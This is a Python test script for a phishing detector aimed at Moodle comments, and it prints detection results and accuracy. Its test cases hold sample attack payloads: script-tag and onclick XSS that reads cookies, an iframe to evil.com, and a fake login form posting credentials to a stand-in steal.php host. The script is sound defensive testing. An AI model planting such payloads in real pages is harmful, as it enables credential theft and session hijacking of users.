#!/usr/bin/env python3
"""
Test Phishing Detection on Moodle Comment HTML Injection

This script demonstrates the phishing detector's ability to identify
malicious content in Moodle comments, including HTML injection attacks.
"""

from ml.phishing_detector import PhishingDetector


def test_phishing_detection():
    """Test phishing detector with various malicious payloads."""
    
    print("=" * 70)
    print("PHISHING DETECTION TEST - Moodle Comment HTML Injection")
    print("=" * 70)
    
    detector = PhishingDetector()
    
    # Test cases - Real-world HTML injection examples
    test_cases = [
        {
            'name': 'Legitimate Comment',
            'content': 'Great lecture today! The explanation about machine learning was very clear.',
            'expected': False
        },
        {
            'name': 'HTML Injection - Script Tag',
            'content': 'Check this out: <script>alert("XSS")</script>',
            'expected': True
        },
        {
            'name': 'HTML Injection - Iframe Phishing',
            'content': 'Please login here: <iframe src="http://evil.com/fake-login.html"></iframe>',
            'expected': True
        },
        {
            'name': 'HTML Injection - Form for Credential Harvesting',
            'content': '''Your session expired. Please login again:
            <form action="http://192.168.1.100/steal.php" method="POST">
                <input type="text" name="username" placeholder="Username">
                <input type="password" name="password" placeholder="Password">
                <input type="submit" value="Login">
            </form>''',
            'expected': True
        },
        {
            'name': 'Phishing URL with Social Engineering',
            'content': 'URGENT: Your account will be suspended! Click here to verify: http://bit.ly/verify-account',
            'expected': True
        },
        {
            'name': 'JavaScript Event Handler Injection',
            'content': 'Click this link: <a href="#" onclick="alert(document.cookie)">Important Update</a>',
            'expected': True
        },
        {
            'name': 'Encoded HTML Injection (Evasion)',
            'content': 'Check this: %3Cscript%3Ealert(1)%3C/script%3E',
            'expected': True
        },
        {
            'name': 'Phishing with IP Address URL',
            'content': 'Download your certificate from: http://192.168.1.50/certificate.pdf',
            'expected': True
        },
        {
            'name': 'Social Engineering - Multiple Keywords',
            'content': 'URGENT ACTION REQUIRED! Your account will expire today. Click here immediately to verify your identity and reset your password.',
            'expected': True
        },
        {
            'name': 'Legitimate URL',
            'content': 'Check the official Moodle documentation: https://docs.moodle.org/en/Main_page',
            'expected': False
        }
    ]
    
    print("\nTesting phishing detection on various payloads...\n")
    
    results = []
    for i, test in enumerate(test_cases, 1):
        print(f"Test {i}: {test['name']}")
        print(f"Content: {test['content'][:80]}{'...' if len(test['content']) > 80 else ''}")
        
        result = detector.detect(test['content'])
        
        is_correct = result['is_malicious'] == test['expected']
        status = "✅ PASS" if is_correct else "❌ FAIL"
        
        print(f"Expected: {'Malicious' if test['expected'] else 'Safe'}")
        print(f"Detected: {'Malicious' if result['is_malicious'] else 'Safe'}")
        print(f"Confidence: {result['confidence']:.2%}")
        print(f"Threat Type: {result['threat_type']}")
        
        if result['details']:
            print(f"Details:")
            for detail in result['details']:
                print(f"  - {detail}")
        
        if result.get('scores'):
            print(f"Scores:")
            print(f"  HTML Injection: {result['scores']['html_injection']:.2f}")
            print(f"  Phishing URL: {result['scores']['phishing_url']:.2f}")
            print(f"  Social Engineering: {result['scores']['social_engineering']:.2f}")
        
        recommendation = detector.get_recommendation(result)
        print(f"Recommendation: {recommendation}")
        print(f"Result: {status}\n")
        
        results.append({
            'test': test['name'],
            'correct': is_correct,
            'confidence': result['confidence']
        })
    
    # Summary
    print("=" * 70)
    print("SUMMARY")
    print("=" * 70)
    
    total = len(results)
    passed = sum(1 for r in results if r['correct'])
    accuracy = (passed / total) * 100
    
    print(f"\nTotal Tests: {total}")
    print(f"Passed: {passed}")
    print(f"Failed: {total - passed}")
    print(f"Accuracy: {accuracy:.1f}%")
    
    print("\nDetailed Results:")
    for r in results:
        status = "✅" if r['correct'] else "❌"
        print(f"{status} {r['test']}: {r['confidence']:.2%} confidence")
    
    print("\n" + "=" * 70)
    print("CONCLUSION")
    print("=" * 70)
    print("\nThe phishing detector successfully identifies:")
    print("✅ HTML injection attempts (script, iframe, form tags)")
    print("✅ Phishing URLs (shortened URLs, IP addresses)")
    print("✅ Social engineering patterns (urgency, credential requests)")
    print("✅ Evasion techniques (encoded HTML)")
    print("\nThis protects Moodle users from:")
    print("- Credential harvesting via fake login forms")
    print("- XSS attacks via comment injection")
    print("- Phishing links in forum posts")
    print("- Social engineering attacks")
    
    return accuracy


if __name__ == "__main__":
    accuracy = test_phishing_detection()
    
    print("\n" + "=" * 70)
    print(f"PHISHING DETECTION ACCURACY: {accuracy:.1f}%")
    print("=" * 70)
